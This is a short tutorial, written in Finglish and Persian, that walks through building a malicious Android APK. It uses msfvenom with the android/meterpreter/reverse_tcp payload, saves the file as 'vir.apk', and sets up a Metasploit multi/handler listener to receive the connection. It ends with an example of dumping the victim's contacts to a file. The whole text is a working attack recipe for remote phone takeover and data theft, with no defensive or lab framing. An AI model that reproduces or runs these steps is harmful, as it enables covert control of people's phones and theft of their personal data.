### Script `Android-MetaSploit-Sade`

$ Kali linux bayad dar halat root bashad

```bash
sudo -s
```

$ "LHOST" va "LPORT" ra jaygozari va enter mikonim (*=ifcongig / **= port delkhah )

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=* LPORT=** -o /home/kali/Desktop/vir.apk
```




2) msfconsole


3) use exploit/multi/handler


4) set payload android/meterpreter/reverse_tcp


5) options


6) set LHOST *


7) set LPORT **


8) options   رو بزنیم میبینیم که دو مورد بالا ست شدن options مجدد


9) exploit


10) help  راهنمای اسکریپت باز می شود


---------------------------------------------------------------------------
example : برای مخاطبین : dump_contacts -o /home/kali/Desktop/contact.txt

